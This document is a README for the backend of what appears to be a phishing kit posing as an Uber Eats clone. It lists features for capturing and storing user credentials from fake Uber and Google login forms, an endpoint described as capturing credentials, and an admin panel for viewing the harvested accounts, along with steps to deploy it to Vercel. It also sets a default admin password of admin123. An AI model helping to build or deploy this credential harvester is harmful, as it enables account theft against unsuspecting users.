# Ubereats Backend API

Backend server for the Ubereats clone project with MongoDB integration.

## Features

- User credential capture and storage
- Admin authentication
- MongoDB integration
- Source tracking (Uber form vs Google form)
- Real-time data synchronization

## Environment Variables

Create a `.env` file with:

```env
PORT=5001
MONGO_URI=mongodb://127.0.0.1:27017/ubereats_clone
ADMIN_USERNAME=admin
ADMIN_PASSWORD=admin123
```

## Local Development

```bash
npm install
npm run dev
```

## Deployment to Vercel

1. Install Vercel CLI: `npm i -g vercel`
2. Run: `vercel`
3. Set environment variables in Vercel dashboard:
   - `MONGO_URI` - Your MongoDB Atlas connection string
   - `ADMIN_USERNAME` - Admin username
   - `ADMIN_PASSWORD` - Admin password

## API Endpoints

- `POST /api/login` - Capture user credentials
- `POST /api/admin/login` - Admin authentication
- `GET /api/admin/users` - Get all users (requires auth)
- `DELETE /api/admin/users/:id` - Delete user (requires auth)

## Tech Stack

- Node.js
- Express.js
- MongoDB with Mongoose
- CORS enabled
